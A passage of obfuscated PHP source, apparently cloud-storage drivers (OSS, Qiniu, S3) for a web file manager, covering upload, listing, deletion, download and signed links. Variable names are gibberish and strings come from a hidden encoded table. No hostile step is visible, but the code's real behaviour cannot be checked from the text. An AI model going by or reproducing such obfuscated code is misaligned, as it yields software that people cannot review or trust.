$›ø²·€Ì[OSS\OssClient::OSS_SUB_RESOURCE] .= $ìêôØé§[1472] . rawurlencode($À¦ãÈã); $Ø¤ûæ°Ì = $this->link($¨Ü†ñ–, $›ø²·€Ì); $this->fileOutLink($Ø¤ûæ°Ì); } public function fileOutServer($×ú êöÊ, $İå¨ËèÇ = false, $ã„ÇßñØ = false, $Êïõ Ê® = '') { parent::fileOut($×ú êöÊ, $İå¨ËèÇ, $ã„ÇßñØ, $Êïõ Ê®); } public function fileOutImage($“Ñš–ÃÃ, $ªÑ¡Ï‘” = 250) { if ($this->size($“Ñš–ÃÃ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($“Ñš–ÃÃ, $ªÑ¡Ï‘”); } $ÉÎ½ğ¶ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[³à¼î¯á][1429] . $ªÑ¡Ï‘”); $êÊ‚”Ëõ = $this->link($“Ñš–ÃÃ, $ÉÎ½ğ¶); $this->fileOutLink($êÊ‚”Ëõ); } public function fileOutImageServer($ °îÊ­¾, $ªğ™Ùó³ = 250) { parent::fileOutImage($ °îÊ­¾, $ªğ™Ùó³); } public function fileOutLink($î……ÆæÇ) { $Â˜í‡ =& $_SERVER[³à¼î¯á]; if (!$this->isCdnHost() && substr($î……ÆæÇ, 0, 7) == $Â˜í‡[1378]) { $î……ÆæÇ = $Â˜í‡[1379] . substr($î……ÆæÇ, 7); } header($Â˜í‡[165] . $î……ÆæÇ); die; } public function hashMd5($½¯ÊÒèï, $´¡ÑŸ¸ü = '') { $É½ŸÖÇ =& $_SERVER[³à¼î¯á]; $§›½¦“¯ = $this->_objectMeta($½¯ÊÒèï); if (!$§›½¦“¯) { return $É½ŸÖÇ[12]; } if (!isset($§›½¦“¯[$É½ŸÖÇ[1449]]) && !empty($´¡ÑŸ¸ü)) { $âØıø¡û = $this->updateObjMeta($½¯ÊÒèï, array($É½ŸÖÇ[1449] => $´¡ÑŸ¸ü)); $§›½¦“¯[$É½ŸÖÇ[1449]] = $âØıø¡û ? $´¡ÑŸ¸ü : $É½ŸÖÇ[12]; } return isset($§›½¦“¯[$É½ŸÖÇ[1449]]) ? strtolower($§›½¦“¯[$É½ŸÖÇ[1449]]) : $É½ŸÖÇ[12]; } public function size($£ÂÑŠÌÄ) { $´Öãâ˜¤ = $this->objectMeta($£ÂÑŠÌÄ); return $´Öãâ˜¤ ? $´Öãâ˜¤[$_SERVER[³à¼î¯á][79]] : 0; } public function info($£óö¹¸É) { if ($this->isFolder($£óö¹¸É)) { return $this->folderInfo($£óö¹¸É); } else { if ($this->isFile($£óö¹¸É)) { return $this->fileInfo($£óö¹¸É); } } return !1; } public function exist($üÚ­×ØÀ) { return $this->isFile($üÚ­×ØÀ) || $this->isFolder($üÚ­×ØÀ); } public function isFile($ãú½¥) { return !$this->isFolder($ãú½¥) && $this->objectMeta($ãú½¥); } public function isFolder($å®™î³è) { return $this->cacheMethod($_SERVER[³à¼î¯á][169], $å®™î³è); } protected function objectMeta($£õÏøùÙ) { return $this->cacheMethod($_SERVER[³à¼î¯á][171], $£õÏøùÙ); } protected function _objectMeta($»Ã«×Ù„) { $ÜÍ¼¦ìí =& $_SERVER[³à¼î¯á]; try { $±ŞŞ§ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($»Ã«×Ù„)); } catch (OSS\Core\OssException $•ÔÇÁÒ) { $this->writeLog(__FUNCTION__ . $ÜÍ¼¦ìí[205] . $•ÔÇÁÒ->getMessage()); $±ŞŞ§ = !1; } if ($±ŞŞ§) { $±ŞŞ§[$ÜÍ¼¦ìí[79]] = intval($±ŞŞ§[$ÜÍ¼¦ìí[1447]]); } return $±ŞŞ§; } protected function _isFolder($¿¥²Ğº›) { $ğ¢µ®‡à =& $_SERVER[³à¼î¯á]; if ($¿¥²Ğº› == $ğ¢µ®‡à[12] || $¿¥²Ğº› == $ğ¢µ®‡à[8]) { return !0; } $²î¡¨Â« = array($ğ¢µ®‡à[1442] => $ğ¢µ®‡à[8], $ğ¢µ®‡à[1443] => rtrim($¿¥²Ğº›, $ğ¢µ®‡à[8]) . $ğ¢µ®‡à[8], $ğ¢µ®‡à[1444] => 1, $ğ¢µ®‡à[1445] => $ğ¢µ®‡à[12]); $õ½òÍşã = $this->client->listObjects($this->bucket, $²î¡¨Â«); if ($õ½òÍşã->getObjectList() || $õ½òÍşã->getPrefixList()) { return !0; } return !1; } public function writeLog($ˆğ¾üìâ = '', $‡›†¼ª½ = false) { $É´±¨Š =& $_SERVER[³à¼î¯á]; $ÄÊâæÁ = in_array(ACTION, array($É´±¨Š[203], $É´±¨Š[204])); if (!$ÄÊâæÁ && !GLOBAL_DEBUG) { return; } $È ¶çØß = 0; if (stripos($ˆğ¾üìâ, $É´±¨Š[1473]) !== !1) { $È ¶çØß = 1; $‹¶àÎø = explode($É´±¨Š[1474], $ˆğ¾üìâ); $ˆğ¾üìâ = !empty($‹¶àÎø[1]) ? $‹¶àÎø[1] : $ˆğ¾üìâ; } else { if (stripos($ˆğ¾üìâ, $É´±¨Š[1475])) { $È ¶çØß = 2; $‹¶àÎø = explode($É´±¨Š[1475], $ˆğ¾üìâ); $‹¶àÎø = explode($É´±¨Š[4], $‹¶àÎø[0]); $ˆğ¾üìâ = !empty($‹¶àÎø[1]) ? $‹¶àÎø[1] : $ˆğ¾üìâ; } } if ($ÄÊâæÁ && I18n::getType() == $É´±¨Š[1476]) { if ($È ¶çØß == 1) { $ˆğ¾üìâ = str_replace($É´±¨Š[1477], $É´±¨Š[1478], $ˆğ¾üìâ); } else { if ($È ¶çØß == 2) { $‹¶àÎø = explode($É´±¨Š[205], $‹¶àÎø[0]); $¨´¢ÙÈ = isset($‹¶àÎø[1]) ? $‹¶àÎø[1] : $É´±¨Š[12]; $‰˜ÜĞûŸ = array($É´±¨Š[1479] => $É´±¨Š[1480], $É´±¨Š[1481] => $É´±¨Š[1482], $É´±¨Š[1483] => $É´±¨Š[1484], $É´±¨Š[1485] => $É´±¨Š[1486], $É´±¨Š[1487] => $É´±¨Š[1488], $É´±¨Š[1489] => $É´±¨Š[1490], $É´±¨Š[1491] => $É´±¨Š[1492], $É´±¨Š[1493] => $É´±¨Š[1494], $É´±¨Š[1495] => $É´±¨Š[1496], $É´±¨Š[1497] => $É´±¨Š[1498]); if (isset($‰˜ÜĞûŸ[$¨´¢ÙÈ])) { $ˆğ¾üìâ = $‰˜ÜĞûŸ[$¨´¢ÙÈ]; } } } if (stripos($ˆğ¾üìâ, $É´±¨Š[1499])) { $ˆğ¾üìâ = $É´±¨Š[1500]; } } if (!trim($ˆğ¾üìâ)) { return; } parent::writeLog(trim($ˆğ¾üìâ), $‡›†¼ª½); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Æ™“•Ñ¨) { parent::__construct(); require_once SDK_DIR . $_SERVER[³à¼î¯á][1501]; $this->_init($Æ™“•Ñ¨); } public function _init($£üÓŸÌ) { $êé¡ĞÅ» =& $_SERVER[³à¼î¯á]; $this->config = $£üÓŸÌ; foreach ($£üÓŸÌ as $Éµ±˜”À => $©Æ…¦) { if (isset($this->{$Éµ±˜”À})) { $this->{$Éµ±˜”À} = $©Æ…¦; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($êé¡ĞÅ»[1502] . LNG($êé¡ĞÅ»[1433])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($İ²ƒêèŠ, $Ì Ù“€ = '', $ü¦ß×¼Œ = REPEAT_RENAME) { if ($this->setContent($İ²ƒêèŠ, $Ì Ù“€)) { return $this->getPathOuter($İ²ƒêèŠ); } return !1; } public function mkdir($×ÛŞ›«Â, $ÁÒ”ü ² = REPEAT_SKIP) { $ôÑ«Ú =& $_SERVER[³à¼î¯á]; $¥¨ÀÁÈÉ = trim($×ÛŞ›«Â, $ôÑ«Ú[8]); if ($this->_isFolder($¥¨ÀÁÈÉ)) { return $this->getPathOuter($¥¨ÀÁÈÉ); } $×ÛŞ›«Â = $¥¨ÀÁÈÉ . $ôÑ«Ú[8]; $¿Ş´†Ó = get_path_this($¥¨ÀÁÈÉ); $ùü‹–º = $×ÛŞ›«Â . $¿Ş´†Ó; if (!$this->mkfile($ùü‹–º)) { return !1; } if (!$this->moveFile($ùü‹–º, $×ÛŞ›«Â)) { $this->delFile($ùü‹–º); return !1; } return $this->getPathOuter($¥¨ÀÁÈÉ); } public function copyFile($‹èË½€, $êÄê“Ÿ†) { $åÆØ¹„¹ = $this->bucketManager->copy($this->bucket, $‹èË½€, $this->bucket, $êÄê“Ÿ†, !0); return $åÆØ¹„¹ ? !1 : $this->getPathOuter($êÄê“Ÿ†); } public function moveFile($õÑ»¨Íè, $ÄŒêò§•) { $Ğ”Ë©çÆ = $this->bucketManager->move($this->bucket, $õÑ»¨Íè, $this->bucket, $ÄŒêò§•, !0); return $Ğ”Ë©çÆ ? !1 : $this->getPathOuter($ÄŒêò§•); } public function delFile($¥À»Ë§Å) { if (!$this->exist($¥À»Ë§Å)) { return !0; } $³ñÒ©òö = $this->bucketManager->delete($this->bucket, $¥À»Ë§Å); return $³ñÒ©òö ? !1 : !0; } public function delFolder($ˆš½Ä®) { $š³·ëƒã =& $_SERVER[³à¼î¯á]; if (!$this->exist($ˆš½Ä®)) { return !0; } $this->listItemCache = !1; $”ÀÈš¦© = $this->fileList($ˆš½Ä®); $this->listItemCache = !0; $ÇøÊü”³ = trim($ˆš½Ä®, $š³·ëƒã[8]) . $š³·ëƒã[8]; if (!empty($ˆš½Ä®) && $ˆš½Ä® !== $š³·ëƒã[219] && !in_array($ÇøÊü”³, $”ÀÈš¦©[$š³·ëƒã[85]])) { $”ÀÈš¦©[$š³·ëƒã[85]][] = $ÇøÊü”³; } $Ø¬†ºÍ˜ = $this->delByBatch($”ÀÈš¦©[$š³·ëƒã[86]]); if (!$Ø¬†ºÍ˜) { return !1; } $Ø¬†ºÍ˜ = $this->delByBatch($”ÀÈš¦©[$š³·ëƒã[85]]); if (!$Ø¬†ºÍ˜) { return !1; } return $this->delFile($ÇøÊü”³); } private function delByBatch($”åšÎÅã) { foreach (array_chunk($”åšÎÅã, 1000) as $ã°Éá•ñ) { $èÈ”·ºÙ = $this->bucketManager->buildBatchDelete($this->bucket, $ã°Éá•ñ); list($Çî‡Åïô, $®õ†ù÷ä) = $this->bucketManager->batch($èÈ”·ºÙ); if ($®õ†ù÷ä) { return !1; } } return !0; } public function rename($íàıÏö, $ÌáˆÔ²) { return $this->renameObject($íàıÏö, $ÌáˆÔ²); } public function fileInfo($ñà²áÅÅ, $·‰³ÅŠ = false, $á¥ïîâí = array()) { $¨æ¢¬™À =& $_SERVER[³à¼î¯á]; $¹Ã”€áÃ = array($¨æ¢¬™À[32] => $this->pathThis($ñà²áÅÅ), $¨æ¢¬™À[87] => $this->getPathOuter($¨æ¢¬™À[8] . $ñà²áÅÅ), $¨æ¢¬™À[33] => $¨æ¢¬™À[221], $¨æ¢¬™À[79] => isset($á¥ïîâí[$¨æ¢¬™À[1503]]) ? $á¥ïîâí[$¨æ¢¬™À[1503]] : 0, $¨æ¢¬™À[178] => $this->ext($ñà²áÅÅ)); if ($·‰³ÅŠ) { return $¹Ã”€áÃ; } $¹Ã”€áÃ[$¨æ¢¬™À[222]] = $¹Ã”€áÃ[$¨æ¢¬™À[88]] = 0; $¹Ã”€áÃ[$¨æ¢¬™À[223]] = $¹Ã”€áÃ[$¨æ¢¬™À[224]] = !0; if (empty($á¥ïîâí)) { $á¥ïîâí = $this->objectMeta($ñà²áÅÅ); if (!$á¥ïîâí) { return $¹Ã”€áÃ; } } if (isset($á¥ïîâí[$¨æ¢¬™À[225]]) && $á¥ïîâí[$¨æ¢¬™À[225]]) { $¹Ã”€áÃ[$¨æ¢¬™À[226]] = $á¥ïîâí[$¨æ¢¬™À[225]]; } if (isset($á¥ïîâí[$¨æ¢¬™À[236]]) && $á¥ïîâí[$¨æ¢¬™À[236]]) { $¹Ã”€áÃ[$¨æ¢¬™À[226]] = $á¥ïîâí[$¨æ¢¬™À[236]]; } if (isset($á¥ïîâí[$¨æ¢¬™À[1504]])) { $¹Ã”€áÃ[$¨æ¢¬™À[88]] = substr($á¥ïîâí[$¨æ¢¬™À[1504]] . $¨æ¢¬™À[12], 0, 10); } if (isset($á¥ïîâí[$¨æ¢¬™À[1503]])) { $¹Ã”€áÃ[$¨æ¢¬™À[79]] = $á¥ïîâí[$¨æ¢¬™À[1503]]; } return $¹Ã”€áÃ; } public function folderInfo($³Ì™†, $˜Ò–Áİô = false) { $ò´Ùåß =& $_SERVER[³à¼î¯á]; $„ÛõÓÑÑ = array($ò´Ùåß[32] => $this->pathThis($³Ì™†), $ò´Ùåß[87] => $this->getPathOuter($ò´Ùåß[8] . $³Ì™†), $ò´Ùåß[33] => $ò´Ùåß[78]); if ($˜Ò–Áİô) { return $„ÛõÓÑÑ; } $„ÛõÓÑÑ[$ò´Ùåß[222]] = $„ÛõÓÑÑ[$ò´Ùåß[88]] = 0; $„ÛõÓÑÑ[$ò´Ùåß[223]] = $„ÛõÓÑÑ[$ò´Ùåß[224]] = !0; $³Ì™† = rtrim($³Ì™†, $ò´Ùåß[8]) . $ò´Ùåß[8]; $îõï¤¯ş = $this->objectMeta($³Ì™†); if (isset($îõï¤¯ş[$ò´Ùåß[1504]])) { $„ÛõÓÑÑ[$ò´Ùåß[88]] = substr($îõï¤¯ş[$ò´Ùåß[1504]] . $ò´Ùåß[12], 0, 10); } return $„ÛõÓÑÑ; } public function listPath($û«–€ÎŸ, $æ¿İÀÄ³ = false) { $½İéÁºã =& $_SERVER[³à¼î¯á]; $ö’Š×°ı = $this->fileList($û«–€ÎŸ, $½İéÁºã[8], !0); foreach ($ö’Š×°ı[$½İéÁºã[85]] as $ô‹ÌŞ±Š => $í‰Şáù) { $ö’Š×°ı[$½İéÁºã[85]][$ô‹ÌŞ±Š] = $this->folderInfo($í‰Şáù, $æ¿İÀÄ³); } foreach ($ö’Š×°ı[$½İéÁºã[86]] as $ô‹ÌŞ±Š => $í‰Şáù) { $ö’Š×°ı[$½İéÁºã[86]][$ô‹ÌŞ±Š] = $this->fileInfo($í‰Şáù[$½İéÁºã[97]], $æ¿İÀÄ³, $í‰Şáù); } return $ö’Š×°ı; } public function has($¢»î¸œ‚, $ÈÎ£éÎ— = false, $àìÍıÔí = true) { $–’¶ôëŞ =& $_SERVER[³à¼î¯á]; $¢»î¸œ‚ = trim($¢»î¸œ‚, $–’¶ôëŞ[8]); $ôüíÉâÖ = empty($¢»î¸œ‚) && $¢»î¸œ‚ !== $–’¶ôëŞ[219] ? $–’¶ôëŞ[12] : $¢»î¸œ‚ . $–’¶ôëŞ[8]; $Äƒ‰øÕ = $–’¶ôëŞ[12]; $×çô”¶Ù = 500; $úÊÜÂóĞ = $–’¶ôëŞ[8]; $’¨©ïî = $ÂŒîõË½ = 0; while (!0) { check_abort(); list($è£ææÚ, $ìš÷È´) = $this->bucketManager->listFiles($this->bucket, $ôüíÉâÖ, $Äƒ‰øÕ, $×çô”¶Ù, $úÊÜÂóĞ); if ($ìš÷È´) { break; } $Äƒ‰øÕ = array_key_exists($–’¶ôëŞ[1445], $è£ææÚ) ? $Äƒ‰øÕ = $è£ææÚ[$–’¶ôëŞ[1505]] : $–’¶ôëŞ[12]; if ($ÈÎ£éÎ—) { if (!empty($è£ææÚ[$–’¶ôëŞ[1506]])) { $’¨©ïî += count($è£ææÚ[$–’¶ôëŞ[1506]]); } if (!empty($è£ææÚ[$–’¶ôëŞ[1507]])) { $ÂŒîõË½ += count($è£ææÚ[$–’¶ôëŞ[1507]]); } if ($Äƒ‰øÕ === $–’¶ôëŞ[12]) { break; } continue; } if ($àìÍıÔí) { if (!empty($è£ææÚ[$–’¶ôëŞ[1506]])) { return !0; } } else { if (!empty($è£ææÚ[$–’¶ôëŞ[1507]])) { return !0; } } if ($Äƒ‰øÕ === $–’¶ôëŞ[12]) { break; } } if ($ÈÎ£éÎ—) { return array($–’¶ôëŞ[230] => $’¨©ïî, $–’¶ôëŞ[231] => $ÂŒîõË½); } return !1; } public function listAll($¬¾ÊìÄ) { $óæ¥µ£ò =& $_SERVER[³à¼î¯á]; $›Ï–‘ã• = $this->fileList($¬¾ÊìÄ, $óæ¥µ£ò[12], !0); $ÅÊ´ø…‘ = array_to_keyvalue($›Ï–‘ã•[$óæ¥µ£ò[86]], $óæ¥µ£ò[32]); foreach ($›Ï–‘ã•[$óæ¥µ£ò[85]] as $Ñï´»ñ´) { if (is_string($Ñï´»ñ´)) { $ÅÊ´ø…‘[$Ñï´»ñ´] = array($óæ¥µ£ò[79] => 0); } } return $this->listAllFiles($¬¾ÊìÄ, $ÅÊ´ø…‘); } private function fileList($‡õÌ‘“¥, $ŸæÒõŞá = '', $Ç±€Ôğ¢ = 0) { $°Ô¯±ø× =& $_SERVER[³à¼î¯á]; $‡õÌ‘“¥ = trim($‡õÌ‘“¥, $°Ô¯±ø×[8]); $ÖÑ‰×ï´ = empty($‡õÌ‘“¥) && $‡õÌ‘“¥ !== $°Ô¯±ø×[219] ? $°Ô¯±ø×[12] : $‡õÌ‘“¥ . $°Ô¯±ø×[8]; $–‹úíƒä = $°Ô¯±ø×[12]; $İâÎ¼âÕ = 1000; $¥é¯öúƒ = $šöĞì¶ = array(); while (!0) { check_abort(); list($÷–¾çÚ, $íÏ«¡ùÏ) = $this->bucketManager->listFiles($this->bucket, $ÖÑ‰×ï´, $–‹úíƒä, $İâÎ¼âÕ, $ŸæÒõŞá); if ($íÏ«¡ùÏ) { break; } $–‹úíƒä = array_key_exists($°Ô¯±ø×[1445], $÷–¾çÚ) ? $–‹úíƒä = $÷–¾çÚ[$°Ô¯±ø×[1505]] : $°Ô¯±ø×[12]; $ÅŸÜ¸“Ò = isset($÷–¾çÚ[$°Ô¯±ø×[1506]]) ? $÷–¾çÚ[$°Ô¯±ø×[1506]] : array(); $‡­ÂŞŒ = isset($÷–¾çÚ[$°Ô¯±ø×[1507]]) ? $÷–¾çÚ[$°Ô¯±ø×[1507]] : array(); foreach ($ÅŸÜ¸“Ò as $’áó÷Ö¦) { if ($’áó÷Ö¦[$°Ô¯±ø×[97]] == $ÖÑ‰×ï´) { continue; } $·òîš†Ö = $’áó÷Ö¦[$°Ô¯±ø×[97]]; $ö”«Š¯… = $’áó÷Ö¦[$°Ô¯±ø×[1503]]; $’áó÷Ö¦[$°Ô¯±ø×[79]] = $ö”«Š¯…; $‰ÙÔîÌ† = $ö”«Š¯… == 0 && substr($·òîš†Ö, strlen($·òîš†Ö) - 1, 1) == $°Ô¯±ø×[8] ? !0 : !1; $this->cacheMethodInfoSet($·òîš†Ö, $‰ÙÔîÌ†, $’áó÷Ö¦); if ($‰ÙÔîÌ†) { $¥é¯öúƒ[] = $·òîš†Ö; continue; } $šöĞì¶[] = $Ç±€Ôğ¢ ? $’áó÷Ö¦ : $·òîš†Ö; } foreach ($‡­ÂŞŒ as $·òîš†Ö) { if ($·òîš†Ö == $ÖÑ‰×ï´) { continue; } $¥é¯öúƒ[] = $·òîš†Ö; $this->cacheMethodInfoSet($·òîš†Ö, !0); } if ($–‹úíƒä === $°Ô¯±ø×[12]) { break; } } $this->cacheMethodInfoSet($‡õÌ‘“¥, !0); return array($°Ô¯±ø×[85] => $¥é¯öúƒ, $°Ô¯±ø×[86] => $šöĞì¶); } public function canRead($ì•Œëö­) { return $this->exist($ì•Œëö­) ? !0 : !1; } public function canWrite($¦åìèÀô) { return $this->exist($¦åìèÀô) ? !0 : !1; } public function getContent($­Åøôø) { return $this->fileSubstr($­Åøôø, 0, -1); } public function setContent($×ç““»‚, $›†ıÚºÊ = '') { $Á ¥Ó‡ = $this->tempFile($this->pathThis($×ç““»‚)); file_put_contents($Á ¥Ó‡, $›†ıÚºÊ); if ($this->upload($×ç““»‚, $Á ¥Ó‡)) { $this->tempFileRemve($Á ¥Ó‡); return !0; } return !1; } public function refreshUrls($”³¸ß¹Ä) { $õñÅ‹‡Ã =& $_SERVER[³à¼î¯á]; $ÈöÊÏİ‡ = array(); if (is_array($”³¸ß¹Ä)) { foreach ($”³¸ß¹Ä as $Ú¨íÕÌ­) { $ÈöÊÏİ‡[] = $this->link($Ú¨íÕÌ­); } } else { $ÈöÊÏİ‡[] = $this->link($”³¸ß¹Ä); } $ş•ÍıÆ = new Qiniu\Cdn\CdnManager($this->auth); list($ìÌÏÈóÔ, $¢ªöİš…) = $ş•ÍıÆ->refreshUrls($ÈöÊÏİ‡); if ($¢ªöİš…) { return !1; } return $ìÌÏÈóÔ[$õñÅ‹‡Ã[1236]] == $õñÅ‹‡Ã[804] ? !0 : !1; } public function fileSubstr($©»µ•ÇÕ, $øŠ¨Çƒ˜, $Á¤ïı‚£) { $ğ£ˆ±÷ì =& $_SERVER[³à¼î¯á]; if (!($€¯ƒøÒ¿ = $this->link($©»µ•ÇÕ))) { return !1; } $²ÁÆŸ— = !1; if ($Á¤ïı‚£ > 0) { $¡´¼æİñ = $øŠ¨Çƒ˜ + $Á¤ïı‚£ - 1; $²ÁÆŸ— = array($ğ£ˆ±÷ì[1508] . $øŠ¨Çƒ˜ . $ğ£ˆ±÷ì[437] . $¡´¼æİñ); } $¤÷¼£–ü = url_request($€¯ƒøÒ¿, $ğ£ˆ±÷ì[252], !1, $²ÁÆŸ—); return $¤÷¼£–ü[$ğ£ˆ±÷ì[795]] ? $¤÷¼£–ü[$ğ£ˆ±÷ì[1256]] : !1; } public function upload($œæ‚¦ñŸ, $ÄÛóÀ„Ò, $¢™ïİ—â = false, $§•àäË§ = REPEAT_REPLACE) { $ÔÓ–½ËÏ = new Qiniu\Storage\UploadManager(); $¹ŸÎÃÙÜ = $this->auth->uploadToken($this->bucket, $œæ‚¦ñŸ); $è¢¾ÊĞñ = get_file_mime(get_path_ext($ÄÛóÀ„Ò)); list($·¡ŒÒ€, $éé¹¤¦) = $ÔÓ–½ËÏ->putFile($¹ŸÎÃÙÜ, $œæ‚¦ñŸ, $ÄÛóÀ„Ò, null, $è¢¾ÊĞñ); return $éé¹¤¦ ? !1 : $this->getPathOuter($œæ‚¦ñŸ); } public function uploadFormData($Ë¶İÌÜ, $ÂâÇğô¢ = 3600) { return $this->uploadToken($Ë¶İÌÜ, $ÂâÇğô¢); } public function multiUploadFormData($Ò›µ¾î, $ËöÈÙ¾Ø = 3600) { return $this->uploadToken($Ò›µ¾î, $ËöÈÙ¾Ø); } private function uploadToken($Ø’Áó‰, $•êèœ™œ = 3600) { $ê•‰×ö“ =& $_SERVER[³à¼î¯á]; $Ê“÷—²¯ = $•êèœ™œ; $Áá¬ÃşÚ = array($ê•‰×ö“[1509] => $ê•‰×ö“[1510]); $æŸª’Ãè = $Ø’Áó‰; $òòöøğõ = $this->auth->uploadToken($this->bucket, $æŸª’Ãè, $Ê“÷—²¯, $Áá¬ÃşÚ, !0); $¼ÌÙğä = empty($this->region) || $this->region == $ê•‰×ö“[1511] ? $ê•‰×ö“[12] : $ê•‰×ö“[437] . $this->region; $©ÆşÖ€‚ = http_type() . "\72\57\x2f\x75\x70\154\x6f\141\144{$¼ÌÙğä}\x2e\161\x69\x6e\151\165\x70\x2e\x63\157\x6d\57"; return array($ê•‰×ö“[1512] => $òòöøğõ, $ê•‰×ö“[1513] => $©ÆşÖ€‚); } public function download($´İ–ê´Ù, $Ê…µÑÚº) { $”ŸÍÊ½ = IO::getPathInner(IO::mkfile($Ê…µÑÚº)); if (!($şš˜Î³ = $this->link($´İ–ê´Ù))) { return !1; } $¬ÖìÑè = 0; $€èõó˜û = 1024 * 200; $¿õÜàöÕ = fopen($”ŸÍÊ½, $_SERVER[³à¼î¯á][1514]); while (!0) { $ŒñÒğÇ = $this->fileSubstr($´İ–ê´Ù, $¬ÖìÑè, $€èõó˜û); if ($ŒñÒğÇ === !1) { return !1; } fwrite($¿õÜàöÕ, $ŒñÒğÇ); $¬ÖìÑè += $€èõó˜û; if (strlen($ŒñÒğÇ) < $€èõó˜û) { break; } } fclose($¿õÜàöÕ); return $Ê…µÑÚº; } public function link($¶ĞÀÀåë, $çæ—ß•ß = '') { if (!$this->isFile($¶ĞÀÀåë)) { return !1; } $™î ¸¼Á = $this->getHost() . $_SERVER[³à¼î¯á][8] . $this->pathEncode($¶ĞÀÀåë) . $çæ—ß•ß; return $this->auth->privateDownloadUrl($™î ¸¼Á, 3600 * 12); } public function fileOut($”µÛ°Ñ, $‰´á›…¬ = false, $•Ñ¾¯†’ = false, $ó½òü« = '') { $ŞæëúÈÏ =& $_SERVER[³à¼î¯á]; if ($this->isFileOutServer()) { return $this->fileOutServer($”µÛ°Ñ, $‰´á›…¬, $•Ñ¾¯†’, $ó½òü«); } if (!$•Ñ¾¯†’) { $•Ñ¾¯†’ = $this->pathThis($”µÛ°Ñ); } $Äì¤¡âª = $‰´á›…¬ ? $ŞæëúÈÏ[1515] . rawurlencode($•Ñ¾¯†’) : $ŞæëúÈÏ[12]; $ş™¹ ÚÎ = $this->link($”µÛ°Ñ, $Äì¤¡âª); $this->fileOutLink($ş™¹ ÚÎ); } public function fileOutServer($îÄˆò“‰, $Ö‡áÕÉ± = false, $Åª‘àÄÁ = false, $»ş±ª• = '') { parent::fileOut($îÄˆò“‰, $Ö‡áÕÉ±, $Åª‘àÄÁ, $»ş±ª•); } public function fileOutImage($ôŒˆŒ„™, $û¤Ó¾²± = 250) { $û»íÌˆş = $this->link($ôŒˆŒ„™, $_SERVER[³à¼î¯á][1516] . $û¤Ó¾²±); $this->fileOutLink($û»íÌˆş); } public function fileOutImageServer($Ó²€´à—, $¾ÇÜÃÌÓ = 250) { parent::fileOutImage($Ó²€´à—, $¾ÇÜÃÌÓ); } public function hashMd5($á¡—±œ) { $ÖÊş¥« =& $_SERVER[³à¼î¯á]; $è©»ø²± = $this->objectMeta($á¡—±œ); return isset($è©»ø²±[$ÖÊş¥«[236]]) ? $è©»ø²±[$ÖÊş¥«[236]] : !1; $§÷˜ª¤Ä = $this->link($á¡—±œ, $ÖÊş¥«[1517]); } public function size($…‰éŞÅ±) { $ƒÀöá»Ò = $this->objectMeta($…‰éŞÅ±); return $ƒÀöá»Ò ? $ƒÀöá»Ò[$_SERVER[³à¼î¯á][79]] : 0; } public function info($ÎªÍñ‰û) { if ($this->isFolder($ÎªÍñ‰û)) { return $this->folderInfo($ÎªÍñ‰û); } else { if ($this->isFile($ÎªÍñ‰û)) { return $this->fileInfo($ÎªÍñ‰û); } } return !1; } public function exist($ªšÑ®°) { return $this->isFile($ªšÑ®°) || $this->isFolder($ªšÑ®°); } public function isFile($äœË¬ö) { return !$this->isFolder($äœË¬ö) && $this->objectMeta($äœË¬ö); } public function isFolder($»ºË“€ï) { return $this->cacheMethod($_SERVER[³à¼î¯á][169], $»ºË“€ï); } protected function objectMeta($´ü¼¯Ş) { return $this->cacheMethod($_SERVER[³à¼î¯á][171], $´ü¼¯Ş); } protected function _objectMeta($ÊùÈ§àè) { $°òÏ¥— =& $_SERVER[³à¼î¯á]; list($›ÜšÛ¶, $©“éÊ†“) = $this->bucketManager->stat($this->bucket, $ÊùÈ§àè); if ($›ÜšÛ¶) { $›ÜšÛ¶[$°òÏ¥—[79]] = intval($›ÜšÛ¶[$°òÏ¥—[1503]]); } return $›ÜšÛ¶; } protected function _isFolder($ÎêÏÆÌÛ) { $Åü¯É¨ =& $_SERVER[³à¼î¯á]; if ($ÎêÏÆÌÛ == $Åü¯É¨[12] || $ÎêÏÆÌÛ == $Åü¯É¨[8]) { return !0; } list($‘÷˜ Èº, $çãôœ»±) = $this->bucketManager->listFiles($this->bucket, trim($ÎêÏÆÌÛ, $Åü¯É¨[8]) . $Åü¯É¨[8], $Åü¯É¨[12], 1, $Åü¯É¨[8]); return !empty($‘÷˜ Èº[$Åü¯É¨[1506]]) || !empty($‘÷˜ Èº[$Åü¯É¨[1507]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ŒšèÕå¼) { parent::__construct($ŒšèÕå¼); } public function uploadFormData($ŠêÉî¦¥, $«¤¦ú­£ = 3600) { $×ø„æ‚¢ =& $_SERVER[³à¼î¯á]; $Ø¥†£“© = $×ø„æ‚¢[220]; $¶šı›¹ = $×ø„æ‚¢[261]; $«ãõãğë = $×ø„æ‚¢[62]; $é¹ËÔ÷ï = gmdate($×ø„æ‚¢[262]); $ ºîÏË° = gmdate($×ø„æ‚¢[263]); $»»Ìå = $×ø„æ‚¢[264]; $®Øû°œâ = $«¤¦ú­£ . $×ø„æ‚¢[12]; $»Å¹ãÌÓ = $×ø„æ‚¢[265]; $Š»ÑØéÎ = array($this->accessKey, $ ºîÏË°, $this->region, $«ãõãğë, $»»Ìå); $ØÌ·µ†– = implode($×ø„æ‚¢[8], $Š»ÑØéÎ); $—œß²ñ× = array($×ø„æ‚¢[266] => gmdate($×ø„æ‚¢[1380], strtotime($×ø„æ‚¢[268])), $×ø„æ‚¢[269] => array(array($×ø„æ‚¢[270] => $this->bucket), array($×ø„æ‚¢[271] => $Ø¥†£“©), array($×ø„æ‚¢[272], $×ø„æ‚¢[273], $×ø„æ‚¢[12]), array($×ø„æ‚¢[272], $×ø„æ‚¢[274], $×ø„æ‚¢[12]), array($×ø„æ‚¢[272], $×ø„æ‚¢[275], 